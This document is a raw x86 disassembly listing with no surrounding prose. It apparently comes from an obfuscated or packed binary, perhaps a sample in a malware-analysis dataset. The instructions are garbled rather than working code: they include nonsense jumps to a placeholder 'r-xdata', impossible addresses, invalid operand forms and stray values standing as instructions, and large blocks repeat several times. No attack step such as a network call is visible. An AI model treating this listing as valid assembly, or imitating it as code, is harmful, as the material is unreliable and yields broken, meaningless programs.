mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa2c2bd
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c620
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f7570
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd5224
add esp 0x4
jae r-xdata
jl 0xf3c365
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5bf
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bada
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404008
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81ceb56d
pop eax
jns r-xdata
jno 0xffffffffefc17df7
out dx eax
jae r-xdata
jne 0xffffffffe3c22206
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fd4
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1c93d
ja r-xdata
jge 0x71fc7f10
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c709
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fd98
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_404011
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffcb8a7
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a47c6e
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa2c2bd
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bed2
pop ecx
jns r-xdata
jno 0xffffffff874f7570
pushfd
push esi
call sub_404008
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_404122
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
jae r-xdata
ja 0xffffffffa3c34fcd
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdec5b3
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc28a
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12e1
jae r-xdata
call sub_404199
jb 0xffffffff81b2be4f
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c620
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_403f84
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd5224
add esp 0x4
jae r-xdata
jl 0xf3c365
jae r-xdata
jmp 0xffffffffff79c0cb
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5bf
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bada
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404011
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa2c2bd
pop ecx
jns r-xdata
jno 0xffffffff874f7570
jg r-xdata
jo 0xffffffffcbc1bed2
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fd4
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c709
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fd98
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_404011
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffcb8a7
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17df7
jge 0x71fc7f10
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_404008
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_404122
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
jae r-xdata
ja 0xffffffffa3c34fcd
jae r-xdata
ja 0xffffffff89a47c6e
ja r-xdata
xor ebx 0xff3d870f
call sub_403f84
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdec5b3
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff79c0cb
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc28a
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12e1
jae r-xdata
call sub_404199
jb 0xffffffff81b2be4f
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c620
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd5224
add esp 0x4
jae r-xdata
jl 0xf3c365
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5bf
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bada
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404034
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_404131
xor ebx 0xff1a830f
jo 0x55969797
call sub_404122
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34fcd
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bc28a
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5b3
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_404199
jb 0xffffffff81b2be4f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
add esp 0x4
jae r-xdata
jl 0xf3c365
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428bada
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158c5bf
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
